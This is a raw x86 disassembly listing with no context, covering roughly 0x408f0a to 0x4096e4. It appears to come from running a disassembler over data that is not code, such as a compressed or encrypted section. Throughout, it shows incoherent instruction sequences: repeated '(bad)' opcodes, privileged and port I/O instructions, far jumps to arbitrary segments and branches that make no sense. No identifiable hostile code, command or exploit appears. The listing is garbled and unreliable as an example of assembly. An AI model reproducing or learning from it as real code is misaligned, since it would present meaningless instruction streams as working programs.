  408f0a:	mov    al,ds:0xe25e20ee
  408f0f:	and    DWORD PTR [esp+ebx*8-0x4e08304a],esp
  408f16:	shl    BYTE PTR [edx+0x68],0xcb
  408f1a:	dec    ebx
  408f1b:	sti    
  408f1c:	mov    cl,0xae
  408f1e:	jbe    0x408ed7
  408f20:	push   cs
  408f21:	cwde   
  408f22:	or     eax,0x3fbdf301
  408f27:	pop    ebx
  408f28:	push   0x6e417f0f
  408f2d:	outs   dx,DWORD PTR ds:[esi]
  408f2e:	inc    eax
  408f2f:	pushf  
  408f30:	or     dl,ch
  408f32:	data16 loope 0x408ef9
  408f35:	inc    esi
  408f36:	(bad)  
  408f38:	push   ss
  408f39:	inc    ecx
  408f3a:	clc    
  408f3b:	push   0x5efa58b
  408f40:	shr    BYTE PTR [ebp+0x3e387b75],0xd7
  408f47:	push   0xffffffa7
  408f49:	fsubr  QWORD PTR [eax+0x3e]
  408f4c:	dec    edx
  408f4d:	mov    ah,0xe4
  408f4f:	pop    es
  408f50:	retf   
  408f51:	(bad)  
  408f52:	xor    BYTE PTR [edi-0x71],cl
  408f55:	sahf   
  408f56:	or     esi,eax
  408f58:	test   al,0x99
  408f5a:	add    eax,0x4b374ca1
  408f5f:	xchg   DWORD PTR [esi+eiz*1+0x3d],esp
  408f63:	push   es
  408f64:	jle    0x408f70
  408f66:	lds    esi,FWORD PTR [edx-0x44]
  408f69:	call   FWORD PTR [edx-0x3a63a9d]
  408f6f:	aad    0xdf
  408f71:	push   ecx
  408f72:	daa    
  408f73:	aad    0x99
  408f75:	neg    BYTE PTR [eax-0x70]
  408f78:	in     al,dx
  408f79:	ins    BYTE PTR es:[edi],dx
  408f7a:	stos   DWORD PTR es:[edi],eax
  408f7b:	inc    eax
  408f7c:	mov    al,ds:0x853ac9ba
  408f81:	fstp   QWORD PTR [esi+0x61]
  408f84:	inc    ebp
  408f85:	imul   edi,DWORD PTR [ebx+0x46],0x1a6129b3
  408f8c:	aad    0xbc
  408f8e:	push   eax
  408f8f:	sub    edi,DWORD PTR [edx+0x3260a28e]
  408f95:	jle    0x408fb3
  408f97:	out    0xeb,al
  408f99:	mov    eax,es:0x3fa24b0a
  408f9f:	sbb    al,0xc6
  408fa1:	and    ah,BYTE PTR [edi-0x68]
  408fa4:	repz fild WORD PTR [ecx+0x75]
  408fa8:	adc    eax,0x541899be
  408fad:	mov    al,ds:0x5d52c835
  408fb2:	loopne 0x408ff5
  408fb4:	fst    st(4)
  408fb6:	ret    
  408fb7:	pop    edx
  408fb8:	sub    DWORD PTR [edi],0xfffffff7
  408fbb:	imul   edx,DWORD PTR [ebx],0xb8cfe33a
  408fc1:	test   eax,0x5d58be0
  408fc6:	dec    ecx
  408fc7:	adc    ch,BYTE PTR [ebx-0xc]
  408fca:	sub    eax,0xf0e92b2a
  408fcf:	mov    BYTE PTR [edi-0x646fdb04],dh
  408fd5:	aam    0xd9
  408fd7:	add    DWORD PTR [esi+0x71ed9a9a],esi
  408fdd:	int    0xa7
  408fdf:	mov    ah,0x89
  408fe1:	push   esp
  408fe2:	mov    dh,0x2e
  408fe4:	lds    ebx,FWORD PTR [ecx+0x7e]
  408fe7:	lahf   
  408fe8:	imul   ebx,DWORD PTR [edx+0x3e],0x0
  408fec:	aam    0x14
  408fee:	xor    eax,0xaaecbbbc
  408ff3:	pop    ebx
  408ff4:	push   esp
  408ff5:	fst    QWORD PTR [edx+edx*8+0x5d785707]
  408ffc:	mov    dl,0x69
  408ffe:	dec    esp
  408fff:	addr16 inc edi
  409001:	fcom   st(1)
  409003:	mov    ebx,0xba97da2f
  409008:	test   al,al
  40900a:	adc    edi,ebp
  40900c:	out    0x79,al
  40900e:	or     al,0x46
  409010:	mov    DWORD PTR [eax+ecx*1+0x2cfdb8ff],eax
  409017:	dec    edi
  409018:	loope  0x408fe7
  40901a:	jno    0x40903f
  40901c:	ss push ds
  40901e:	out    dx,al
  40901f:	pop    esi
  409020:	aaa    
  409021:	sbb    ebp,ecx
  409023:	mov    ds:0x4ef70356,al
  409028:	xchg   DWORD PTR [ecx+esi*2-0x5b],edi
  40902c:	ret    
  40902d:	nop
  40902e:	mov    eax,ds:0x8f4a5ffe
  409033:	sbb    al,0x42
  409035:	rol    BYTE PTR [ecx],1
  409037:	sbb    bl,BYTE PTR [edi+0x78b1fb6a]
  40903d:	sar    BYTE PTR [edi-0xc956f68],1
  409043:	loop   0x4090ab
  409045:	arpl   di,bp
  409047:	or     DWORD PTR [eax+0x29c6a09f],edx
  40904d:	fwait
  40904e:	ret    
  40904f:	mov    ds:0x3975b2f5,eax
  409054:	pusha  
  409055:	inc    ebp
  409056:	dec    ebx
  409057:	inc    ecx
  409058:	add    bh,BYTE PTR [eax]
  40905a:	fidivr WORD PTR [ebx-0x4b]
  40905d:	sub    al,0xa5
  40905f:	fldcw  WORD PTR [edi+0x74668e51]
  409065:	pop    ss
  409066:	imul   ecx,ecx,0xebff1400
  40906c:	dec    ebp
  40906d:	add    eax,ebp
  40906f:	cmp    ecx,DWORD PTR [edi+ebx*4]
  409072:	pushf  
  409073:	mov    esp,0x96e3957d
  409078:	retf   0xda84
  40907b:	mov    esp,0xbaec716
  409080:	sbb    bh,BYTE PTR [ebx-0x6c]
  409083:	push   esi
  409084:	sub    al,0xbe
  409086:	pop    ecx
  409087:	xchg   esp,eax
  409088:	shl    BYTE PTR [eax],cl
  40908a:	push   0xffffffe7
  40908c:	bound  ecx,QWORD PTR [ecx-0xe]
  40908f:	sti    
  409090:	mov    edi,0xb77b5c66
  409095:	aas    
  409096:	fimul  WORD PTR [ebp-0x4b0d0f3b]
  40909c:	mov    ds:0xb9290efc,eax
  4090a1:	mov    ?,WORD PTR [eax]
  4090a3:	out    dx,al
  4090a4:	icebp  
  4090a5:	dec    esi
  4090a6:	inc    ebp
  4090a7:	rol    BYTE PTR [ebp+0x48],1
  4090aa:	adc    bh,BYTE PTR [ebp+0x8f7813a]
  4090b0:	aas    
  4090b1:	add    BYTE PTR [ebp-0x64a16aa4],al
  4090b7:	(bad)  
  4090b8:	in     eax,dx
  4090b9:	fistp  DWORD PTR [eax]
  4090bb:	xchg   BYTE PTR [eax],bl
  4090bd:	inc    eax
  4090be:	inc    ecx
  4090bf:	jo     0x4090e9
  4090c1:	std    
  4090c2:	aaa    
  4090c3:	je     0x409062
  4090c5:	out    dx,al
  4090c6:	dec    edi
  4090c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090c8:	cs dec esi
  4090ca:	out    dx,al
  4090cb:	out    0xd4,eax
  4090cd:	ds dec esp
  4090cf:	mov    eax,ds:0x9bfb58d1
  4090d4:	retf   0xa7ae
  4090d7:	inc    ebx
  4090d8:	enter  0xce69,0x66
  4090dc:	outs   dx,DWORD PTR ds:[esi]
  4090dd:	enter  0xa8a6,0xbb
  4090e1:	das    
  4090e2:	add    ecx,DWORD PTR [esi]
  4090e4:	mov    DWORD PTR gs:[ebx-0x76],edi
  4090e8:	xlat   BYTE PTR ds:[ebx]
  4090e9:	jne    0x409084
  4090eb:	dec    ebp
  4090ec:	mov    dh,BYTE PTR [edx-0x6d]
  4090ef:	jo     0x409106
  4090f1:	je     0x409161
  4090f3:	sub    DWORD PTR [ebp+0x1c3889cd],ebp
  4090f9:	mov    ds,ecx
  4090fb:	mov    cl,0x0
  4090fd:	shl    cl,0xa3
  409100:	ins    BYTE PTR es:[edi],dx
  409101:	loopne 0x409111
  409103:	pop    ebp
  409104:	jge    0x4090d5
  409106:	stc    
  409107:	scas   eax,DWORD PTR es:[edi]
  409108:	push   es
  409109:	dec    ecx
  40910a:	hlt    
  40910b:	add    ebx,DWORD PTR [ebp-0x1b]
  40910e:	(bad)  
  40910f:	cld    
  409110:	out    0xa1,eax
  409112:	fs pop eax
  409114:	mov    ah,dh
  409116:	mov    ds:0x126edcae,al
  40911b:	div    ah
  40911d:	ins    DWORD PTR es:[edi],dx
  40911e:	lahf   
  40911f:	add    ebp,DWORD PTR [esi]
  409121:	mov    al,0x11
  409123:	dec    eax
  409124:	sti    
  409125:	fcmove st,st(7)
  409127:	sbb    DWORD PTR [eax],edx
  409129:	jnp    0x409196
  40912b:	shr    DWORD PTR [edi],1
  40912d:	xchg   ebx,eax
  40912e:	cmp    al,0x18
  409130:	retf   
  409131:	xchg   edi,eax
  409132:	jmp    0xb400:0x2e9ca532
  409139:	cmc    
  40913a:	and    esi,edi
  40913c:	ucomiss xmm3,DWORD PTR [ebx-0x41]
  409140:	scas   eax,DWORD PTR es:[edi]
  409141:	sub    edx,DWORD PTR [esi+0x4625d9f5]
  409147:	and    al,0xf9
  409149:	cmp    DWORD PTR [ebx+0x458bf06],ebp
  40914f:	adc    al,0x74
  409151:	aam    0xb
  409153:	repz mov bl,0xbc
  409156:	in     al,0x82
  409158:	loope  0x409133
  40915a:	add    dh,bh
  40915c:	addr16 dec ecx
  40915e:	fcmove st,st(0)
  409160:	sbb    BYTE PTR [edi+0x16],ah
  409163:	call   0x63e1f8d5
  409168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409169:	setne  cl
  40916c:	push   edi
  40916d:	pusha  
  40916e:	or     cl,BYTE PTR [ebp-0x3bf85ca6]
  409174:	and    DWORD PTR [eax],ebx
  409176:	ins    BYTE PTR es:[edi],dx
  409177:	scas   eax,DWORD PTR es:[edi]
  409178:	iret   
  409179:	call   0x60abcc58
  40917e:	jge    0x4091e1
  409180:	xchg   ecx,eax
  409181:	or     al,0xe
  409183:	shl    BYTE PTR [ecx-0x6a],0x90
  409187:	lea    esi,[ebx-0x15b53107]
  40918d:	push   ecx
  40918e:	div    BYTE PTR es:[eax-0x23]
  409192:	jae    0x4091be
  409194:	inc    ebx
  409195:	imul   esi,DWORD PTR [ebp-0x7ea3be4a],0xffffffed
  40919c:	mov    bl,0x8d
  40919e:	cdq    
  40919f:	inc    esp
  4091a0:	mov    al,0x24
  4091a2:	jle    0x4091b4
  4091a4:	inc    eax
  4091a5:	adc    DWORD PTR gs:[edx+0x7c3c8da3],ebp
  4091ac:	jnp    0x409155
  4091ae:	je     0x409147
  4091b0:	(bad)  
  4091b2:	in     al,dx
  4091b3:	cli    
  4091b4:	dec    edx
  4091b5:	mov    dh,0xbe
  4091b7:	mov    cl,dl
  4091b9:	inc    edx
  4091ba:	dec    edi
  4091bb:	inc    ebp
  4091bc:	repz pusha 
  4091be:	xchg   BYTE PTR [eax-0x211df6ac],cl
  4091c4:	xor    ah,ah
  4091c6:	push   es
  4091c7:	jo     0x40918b
  4091c9:	push   esi
  4091ca:	jbe    0x40918e
  4091cc:	loopne 0x40918e
  4091ce:	shl    DWORD PTR [edi+0x360e49f9],1
  4091d4:	and    BYTE PTR [edx],ch
  4091d6:	aas    
  4091d7:	or     eax,DWORD PTR [ecx]
  4091d9:	cld    
  4091da:	xor    ebp,DWORD PTR [ecx+0x6b]
  4091dd:	icebp  
  4091de:	xor    al,0xc9
  4091e0:	mov    esi,0x4589542
  4091e5:	push   ebx
  4091e6:	dec    edx
  4091e7:	test   DWORD PTR [ebp+0x7a],0x57820875
  4091ee:	je     0x409245
  4091f0:	dec    ebp
  4091f1:	xor    esp,ebp
  4091f3:	add    eax,0x3d10a412
  4091f8:	inc    ebx
  4091f9:	pop    esi
  4091fa:	mov    ch,0x2
  4091fc:	sbb    edx,DWORD PTR [ecx-0x2a]
  4091ff:	inc    ecx
  409200:	call   0x5338:0xd22747d2
  409207:	scas   al,BYTE PTR es:[edi]
  409208:	inc    esp
  409209:	ss inc ebx
  40920b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40920c:	mov    ch,0x9b
  40920e:	push   ds
  40920f:	push   ebp
  409210:	les    eax,FWORD PTR [edx-0x4ca5908e]
  409216:	adc    al,0xa4
  409218:	adc    esp,DWORD PTR [ecx-0x2b8cc57c]
  40921e:	mov    al,gs:0x49192538
  409224:	popa   
  409225:	push   ds
  409226:	in     eax,0x35
  409228:	mov    eax,ds:0x774f1d27
  40922d:	test   bh,dh
  40922f:	scas   al,BYTE PTR es:[edi]
  409230:	sbb    DWORD PTR [esi],0xffffffbb
  409233:	push   ds
  409234:	xor    bl,dl
  409236:	shr    ah,1
  409238:	daa    
  409239:	dec    esi
  40923a:	out    0xfa,al
  40923c:	mov    bh,0x75
  40923e:	je     0x409259
  409240:	push   ds
  409241:	retf   
  409242:	sub    DWORD PTR [edi-0x4137319d],edi
  409248:	sbb    ah,al
  40924a:	imul   ebp,DWORD PTR [esi],0xffffffc7
  40924d:	rcl    eax,0x12
  409250:	pop    es
  409251:	jp     0x40923b
  409253:	hlt    
  409254:	pop    ss
  409255:	int    0xdb
  409257:	es add eax,0xc9fb9ce8
  40925d:	pop    ss
  40925e:	imul   BYTE PTR ds:0x20c123e0
  409264:	mov    fs,WORD PTR [eax]
  409266:	xchg   ecx,eax
  409267:	or     eax,0xa4a6181b
  40926c:	cdq    
  40926d:	ja     0x4091f1
  40926f:	gs or  eax,0xeb58d9cd
  409275:	stos   BYTE PTR es:[edi],al
  409276:	sub    al,0x24
  409278:	or     DWORD PTR [ebp+0x36],edi
  40927b:	mov    ds:0x177e3889,eax
  409280:	jb     0x4092a3
  409282:	sbb    edi,DWORD PTR [edx]
  409284:	pusha  
  409285:	xor    al,0x52
  409287:	out    dx,al
  409288:	xor    bh,BYTE PTR [esi+0x15305f54]
  40928e:	cwde   
  40928f:	jl     0x409230
  409291:	les    edx,FWORD PTR [ebx+edx*8-0x30]
  409295:	or     eax,0x41f145c1
  40929a:	les    eax,FWORD PTR [esi]
  40929c:	out    0xc1,al
  40929e:	addr16 retf 
  4092a0:	sub    esi,edx
  4092a2:	into   
  4092a3:	lsl    edi,WORD PTR [ecx]
  4092a6:	iret   
  4092a7:	(bad)  
  4092a8:	icebp  
  4092a9:	mov    DWORD PTR ds:0xa870a244,ebx
  4092af:	mov    eax,0xa77dc14d
  4092b4:	retf   
  4092b5:	push   ss
  4092b6:	jb     0x409336
  4092b8:	pop    ebx
  4092b9:	(bad)  [edi+ebp*1]
  4092bc:	push   esp
  4092bd:	ins    DWORD PTR es:[edi],dx
  4092be:	mov    ch,0xa2
  4092c0:	loope  0x40930b
  4092c2:	scas   al,BYTE PTR es:[edi]
  4092c3:	out    0x13,al
  4092c5:	imul   esi,DWORD PTR [edx+eax*2-0x6163442b],0xc4a70e01
  4092d0:	daa    
  4092d1:	jbe    0x409323
  4092d3:	dec    esp
  4092d4:	add    esp,DWORD PTR [ecx]
  4092d6:	mov    esp,0x58a87003
  4092db:	pop    esp
  4092dc:	sub    ch,BYTE PTR [ebx+0x2]
  4092df:	in     eax,dx
  4092e0:	push   ecx
  4092e1:	lock sub DWORD PTR fs:[edi+0x1],ecx
  4092e6:	jl     0x40931d
  4092e8:	dec    ebp
  4092e9:	sbb    ch,al
  4092eb:	loope  0x409351
  4092ed:	sbb    BYTE PTR [edi],ch
  4092ef:	jmp    DWORD PTR ss:[ebx+0x65c574ef]
  4092f6:	push   ax
  4092f8:	push   0x596ac709
  4092fd:	xchg   ebp,eax
  4092fe:	test   DWORD PTR [ecx+0x5d],0x8cca0cec
  409305:	stc    
  409306:	stos   DWORD PTR es:[edi],eax
  409307:	mov    ?,WORD PTR [ecx-0x12]
  40930a:	popa   
  40930b:	into   
  40930c:	test   DWORD PTR [edi-0x4c],esp
  40930f:	in     eax,0x47
  409311:	outs   dx,BYTE PTR ds:[esi]
  409312:	iret   
  409313:	push   ebx
  409314:	fs or  al,0xb6
  409317:	shr    BYTE PTR [ecx+0x5e1c9f4e],1
  40931d:	jp     0x409386
  40931f:	icebp  
  409320:	cmp    al,BYTE PTR [eax-0x488c21bb]
  409326:	jnp    0x40938c
  409328:	and    al,0x56
  40932a:	ds aam 0x15
  40932d:	fnstcw WORD PTR [edi]
  40932f:	aaa    
  409330:	outs   dx,BYTE PTR ds:[esi]
  409331:	fst    DWORD PTR [edx+eiz*1+0x4d4d9606]
  409338:	sub    ebp,DWORD PTR [ebp-0x7808a714]
  40933e:	mov    al,0x74
  409340:	mov    ss,WORD PTR [ecx]
  409342:	(bad)  
  409343:	js     0x40934c
  409345:	sbb    al,0x22
  409347:	ret    
  409348:	sar    BYTE PTR fs:[eax+0x2],cl
  40934c:	shl    DWORD PTR [esi+0xd70251d],0xa1
  409353:	jbe    0x40933d
  409355:	leave  
  409356:	int    0x27
  409358:	mov    bl,0xa4
  40935a:	ror    BYTE PTR [eax+0x7632c44c],cl
  409360:	or     al,0xd1
  409362:	push   cs
  409363:	call   FWORD PTR [edi+0x2a16e944]
  409369:	test   cl,cl
  40936b:	jae    0x4093d5
  40936d:	mov    ecx,0x943ca9de
  409372:	mov    esi,0x7999e4aa
  409377:	or     ebx,DWORD PTR [ecx+0x695d2234]
  40937d:	inc    edx
  40937e:	dec    edi
  40937f:	(bad)  [eax+0x20]
  409382:	push   edx
  409383:	push   ds
  409384:	ror    DWORD PTR [eax+0x76],0xfc
  409388:	retf   0x3cc6
  40938b:	mov    ch,0x85
  40938d:	fld    DWORD PTR [edx-0x5f]
  409390:	mov    es,edx
  409392:	inc    eax
  409393:	inc    esp
  409394:	hlt    
  409395:	lods   eax,DWORD PTR ds:[esi]
  409396:	mov    ecx,0x75b5fad1
  40939b:	xlat   BYTE PTR ds:[ebx]
  40939c:	and    al,BYTE PTR [esi]
  40939e:	mov    ds:0x9988f089,al
  4093a3:	enter  0x3400,0x57
  4093a7:	xchg   edx,eax
  4093a8:	pop    esi
  4093a9:	jge    0x409390
  4093ab:	mov    dh,0xc2
  4093ad:	sti    
  4093ae:	jecxz  0x40933c
  4093b0:	mov    ebp,edi
  4093b2:	aad    0x5c
  4093b4:	aam    0x3f
  4093b6:	jecxz  0x4093b7
  4093b8:	aas    
  4093b9:	pop    ebx
  4093ba:	xor    al,0x37
  4093bc:	fistp  QWORD PTR [ebx-0x4a]
  4093bf:	dec    edi
  4093c0:	repnz iret 
  4093c2:	add    al,0x5b
  4093c4:	shl    DWORD PTR [eax+edi*8-0x52],cl
  4093c8:	cmc    
  4093c9:	mov    ds:0xf5ed4df5,eax
  4093ce:	and    cl,al
  4093d0:	pushf  
  4093d1:	xchg   ebx,eax
  4093d2:	sbb    BYTE PTR [edx],bh
  4093d4:	outs   dx,DWORD PTR ds:[esi]
  4093d5:	std    
  4093d6:	xchg   ebp,eax
  4093d7:	lods   eax,DWORD PTR ds:[esi]
  4093d8:	hlt    
  4093d9:	jne    0x409425
  4093db:	mov    ds:0x33303937,al
  4093e0:	jecxz  0x409390
  4093e2:	pop    ecx
  4093e3:	or     edi,DWORD PTR [eax-0x4f24b36f]
  4093e9:	call   0xff21b834
  4093ee:	(bad)  
  4093ef:	push   0xc78df17f
  4093f4:	sbb    bh,ch
  4093f6:	sub    eax,0x4f9f27fc
  4093fb:	mov    ecx,0xc7d7a72b
  409400:	xchg   ebp,eax
  409401:	sbb    esi,ebx
  409403:	aas    
  409404:	ror    esi,cl
  409406:	dec    esi
  409407:	mov    ebx,0x73f25ff5
  40940c:	push   ecx
  40940d:	mov    cl,0x77
  40940f:	sub    BYTE PTR [ecx],dh
  409411:	mov    ds:0x9e5565a1,al
  409416:	jg     0x409429
  409418:	pop    edx
  409419:	out    dx,al
  40941a:	mov    edi,0xbb3b90ba
  40941f:	stos   DWORD PTR es:[edi],eax
  409420:	arpl   WORD PTR [esi-0x7ad541d7],cx
  409426:	lds    edx,FWORD PTR [esi]
  409428:	jge    0x40941f
  40942a:	jae    0x409450
  40942c:	push   edx
  40942d:	and    al,0x8
  40942f:	sub    al,0x30
  409431:	outs   dx,BYTE PTR ds:[esi]
  409432:	jecxz  0x409451
  409434:	std    
  409435:	popf   
  409436:	xor    BYTE PTR [ebx-0x64b99f0d],ah
  40943c:	inc    edi
  40943d:	dec    esi
  40943e:	pop    ecx
  40943f:	mov    ch,0x3b
  409441:	push   esp
  409442:	hlt    
  409443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409444:	mov    eax,ds:0x34249b85
  409449:	cmp    al,0xc9
  40944b:	aaa    
  40944c:	pop    es
  40944d:	enter  0x7d92,0xb1
  409451:	int    0xe
  409453:	je     0x4094b5
  409455:	pop    es
  409456:	dec    esp
  409457:	push   esi
  409458:	jnp    0x4093f6
  40945a:	push   ebp
  40945b:	imul   edi,DWORD PTR [esp+ebx*8],0x9c149354
  409462:	mov    esp,0x7d9266b5
  409467:	test   eax,0x9a92f86e
  40946c:	(bad)  
  40946d:	je     0x4094a6
  40946f:	xchg   esi,eax
  409470:	dec    ecx
  409471:	cwde   
  409472:	adc    al,0x50
  409474:	mov    cl,0x2f
  409476:	fldl2e 
  409478:	out    0x39,al
  40947a:	std    
  40947b:	mov    esp,0x4a17cab3
  409480:	shl    edx,cl
  409482:	add    al,0xc0
  409484:	mov    ah,BYTE PTR [ebx-0x43]
  409487:	pop    esi
  409488:	jmp    0xb720:0xf0302655
  40948f:	mov    ah,0xdf
  409491:	fwait
  409492:	lahf   
  409493:	call   0xd899088
  409498:	outs   dx,DWORD PTR ds:[esi]
  409499:	retf   
  40949a:	test   BYTE PTR [ecx],al
  40949c:	mov    dl,0xca
  40949e:	es mov eax,0xcdf3baaa
  4094a4:	aad    0x54
  4094a6:	das    
  4094a7:	sahf   
  4094a8:	push   ecx
  4094a9:	fistp  QWORD PTR [ebx+0x14]
  4094ac:	mov    edi,0x5de997e8
  4094b1:	jecxz  0x4094b7
  4094b3:	cmp    bl,ch
  4094b5:	nop
  4094b6:	outs   dx,DWORD PTR ds:[esi]
  4094b7:	dec    eax
  4094b8:	loope  0x40944c
  4094ba:	push   ebx
  4094bb:	sub    eax,DWORD PTR [ebp+0x5b]
  4094be:	rcl    BYTE PTR [edx],1
  4094c0:	dec    ecx
  4094c1:	cld    
  4094c2:	sti    
  4094c3:	jle    0x409542
  4094c5:	fnsetpm(287 only) 
  4094c7:	jnp    0x4094c7
  4094c9:	or     dh,bh
  4094cb:	adc    eax,0x68430b9
  4094d0:	cmp    al,BYTE PTR [edi+0x568ff56b]
  4094d6:	mov    dh,0x70
  4094d8:	mov    bh,0xc9
  4094da:	pop    esi
  4094db:	imul   ecx,DWORD PTR ds:0x635dfe3f,0x51287f5d
  4094e5:	iret   
  4094e6:	hlt    
  4094e7:	dec    ecx
  4094e8:	jmp    FWORD PTR [esi-0x998c6a]
  4094ee:	es (bad) 
  4094f0:	in     al,dx
  4094f1:	inc    edx
  4094f2:	mov    eax,DWORD PTR [ebx-0x293b9349]
  4094f8:	fs jl  0x409496
  4094fb:	(bad)  
  4094fd:	cdq    
  4094fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094ff:	shl    ebp,1
  409501:	or     bh,BYTE PTR [ecx+0x4a2c6244]
  409507:	or     ah,dh
  409509:	push   0x8879c27
  40950e:	mov    ah,0x4
  409510:	mov    ecx,0x7d44e264
  409515:	aad    0x8e
  409517:	es mov bh,0x5b
  40951a:	ror    DWORD PTR [esi+0x20],0xa1
  40951e:	mov    eax,ds:0x9bd09b7d
  409523:	outs   dx,DWORD PTR ds:[esi]
  409524:	xchg   BYTE PTR [ebx-0x79],bl
  409527:	in     eax,0x64
  409529:	mov    bh,0xcb
  40952b:	xchg   BYTE PTR [edi+0x2d8d2793],cl
  409531:	mov    esi,0x733a587e
  409536:	mov    esp,0xc51b0d3a
  40953b:	fwait
  40953c:	test   DWORD PTR [eax],0xcde67e03
  409542:	inc    edi
  409543:	mov    eax,ds:0x9a804b64
  409548:	rcr    DWORD PTR [edi+edi*8+0x65742f3e],0x7e
  409550:	jecxz  0x40958d
  409552:	and    dl,dl
  409554:	shl    DWORD PTR [ebx+ebp*4],cl
  409557:	push   edx
  409558:	jne    0x409590
  40955a:	test   DWORD PTR [ebp+0x48],ebx
  40955d:	adc    eax,0x88b119ac
  409562:	fldenv [eax-0x17738988]
  409568:	xor    eax,0xcbf26407
  40956d:	jmp    0x409569
  40956f:	xchg   ebp,eax
  409570:	sub    eax,0x85f02a09
  409575:	(bad)  [ebx+0x63321546]
  40957b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40957c:	jnp    0x40952d
  40957e:	mov    bl,0x75
  409580:	mov    DWORD PTR [esi],esp
  409582:	adc    DWORD PTR [edi-0x4b],esp
  409585:	outs   dx,DWORD PTR ds:[esi]
  409586:	js     0x4095b8
  409588:	scas   eax,DWORD PTR es:[edi]
  409589:	sub    edi,DWORD PTR [ebp+0x2e5281d9]
  40958f:	pushf  
  409590:	adc    eax,0x84c559e2
  409596:	test   al,0xd2
  409598:	cmp    ecx,DWORD PTR gs:[edi+edi*4+0x6c]
  40959d:	jne    0x409617
  40959f:	jnp    0x409601
  4095a1:	adc    al,0xba
  4095a3:	imul   edi,DWORD PTR [edi+0xe],0x5c
  4095a7:	cli    
  4095a8:	dec    eax
  4095a9:	and    bh,dl
  4095ab:	stc    
  4095ac:	jmp    0x4880:0x6a51ce6f
  4095b3:	clc    
  4095b4:	jmp    0x1a3a:0x39012f12
  4095bb:	pop    es
  4095bc:	stos   DWORD PTR es:[edi],eax
  4095bd:	mov    BYTE PTR [edx],bh
  4095bf:	lock mov ebp,0x16998e2a
  4095c5:	out    0xf4,eax
  4095c7:	add    ebp,DWORD PTR [esi]
  4095c9:	push   ebx
  4095ca:	pop    ebp
  4095cb:	hlt    
  4095cc:	cs enter 0x5abd,0x9d
  4095d1:	mov    gs,WORD PTR [eax+0x9415b05]
  4095d7:	stc    
  4095d8:	adc    al,0x6b
  4095da:	mov    ebp,0x7186a745
  4095df:	mov    edx,gs
  4095e1:	lock adc dl,BYTE PTR [ebx-0x26a25c34]
  4095e8:	mov    dl,0x3c
  4095ea:	fnsave [edx-0x2d]
  4095ed:	js     0x4095dc
  4095ef:	in     al,dx
  4095f0:	lds    ecx,FWORD PTR [esi]
  4095f2:	xchg   edx,eax
  4095f3:	gs popa 
  4095f5:	jnp    0x409583
  4095f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095f8:	jno    0x4095d9
  4095fa:	sti    
  4095fb:	enter  0xb96,0xd8
  4095ff:	je     0x40965d
  409601:	stos   DWORD PTR es:[edi],eax
  409602:	push   ecx
  409603:	(bad)  
  409604:	(bad)  
  409605:	stc    
  409606:	mov    DWORD PTR [eax-0x7510eeb5],esi
  40960c:	sbb    eax,0xa58916b
  409611:	mov    dh,0xd2
  409613:	sbb    al,0x4f
  409615:	pop    ecx
  409616:	mov    BYTE PTR [ecx-0x41],ah
  409619:	ss inc esp
  40961b:	es pop ss
  40961d:	jbe    0x4095a5
  40961f:	shr    eax,0xfa
  409622:	push   es
  409623:	cmp    al,cl
  409625:	xor    BYTE PTR [edx],bh
  409627:	mov    bh,0x7d
  409629:	adc    ch,BYTE PTR [ebx+0x31]
  40962c:	in     al,0xaa
  40962e:	cmp    cl,BYTE PTR [ebx-0x58d7d2b1]
  409634:	call   DWORD PTR [ebp-0x3d6652d8]
  40963a:	fistp  WORD PTR [edi]
  40963c:	int3   
  40963d:	sbb    al,0xe8
  40963f:	frstor [ebp+0x11]
  409642:	leave  
  409643:	jnp    0x4095c6
  409645:	in     eax,0x77
  409647:	pop    ebp
  409648:	jge    0x4095d2
  40964a:	gs or  ecx,ebx
  40964d:	test   BYTE PTR [esi-0x62],dh
  409650:	jmp    DWORD PTR [ebx-0x6f576f7b]
  409656:	cmc    
  409657:	iret   
  409658:	ror    DWORD PTR [esi],1
  40965a:	fwait
  40965b:	and    cl,BYTE PTR [ebx-0x2a3ef33e]
  409661:	mov    bl,BYTE PTR [eax]
  409663:	mov    gs,esi
  409665:	fwait
  409666:	xor    dh,BYTE PTR ds:0x3f58d0d6
  40966c:	and    dh,ch
  40966e:	inc    ecx
  40966f:	dec    esp
  409670:	ffreep st(4)
  409672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409673:	aaa    
  409674:	lea    esi,[ecx+0x7de0123c]
  40967a:	jnp    0x4096d7
  40967c:	shl    DWORD PTR [edx],cl
  40967e:	pop    es
  40967f:	shr    BYTE PTR [edx],1
  409681:	cmp    ebp,DWORD PTR [eax-0x3]
  409684:	dec    eax
  409685:	fld    TBYTE PTR [ecx+edx*4-0x15]
  409689:	repz in al,0x18
  40968c:	push   ebp
  40968d:	sbb    ch,al
  40968f:	xchg   ebx,eax
  409690:	imul   BYTE PTR [eiz*4+0xfbbae3d]
  409697:	xlat   BYTE PTR ds:[ebx]
  409698:	jno    0x4096e9
  40969a:	mov    ebp,0x5acb367a
  40969f:	dec    esi
  4096a0:	daa    
  4096a1:	cmp    BYTE PTR [edi-0x590da5fb],dl
  4096a7:	pop    eax
  4096a8:	outs   dx,DWORD PTR ds:[esi]
  4096a9:	scas   eax,DWORD PTR es:[edi]
  4096aa:	mov    ecx,0x8693e222
  4096af:	sub    DWORD PTR [edi],ecx
  4096b1:	leave  
  4096b2:	scas   eax,DWORD PTR es:[edi]
  4096b3:	stos   DWORD PTR es:[edi],eax
  4096b4:	xor    BYTE PTR gs:[ebp-0x5c81e737],bl
  4096bb:	sub    ebx,DWORD PTR [ebx+edx*2+0x5d]
  4096bf:	xchg   BYTE PTR [ebx],al
  4096c1:	mov    eax,ds:0xda716486
  4096c6:	lods   eax,DWORD PTR ds:[esi]
  4096c7:	add    ebp,DWORD PTR [ebx+0x75]
  4096ca:	cmp    BYTE PTR [esi-0x12],0x19
  4096ce:	aad    0xd8
  4096d0:	shl    BYTE PTR ds:0xfd1e873c,1
  4096d6:	adc    al,0x3d
  4096d8:	jnp    0x409758
  4096da:	sub    DWORD PTR [eax],ebp
  4096dc:	and    bh,BYTE PTR ds:0x34befedb
  4096e2:	cmp    cl,BYTE PTR [ecx]
  4096e4:	mov    DWORD PTR [ebp-0x63],ebx
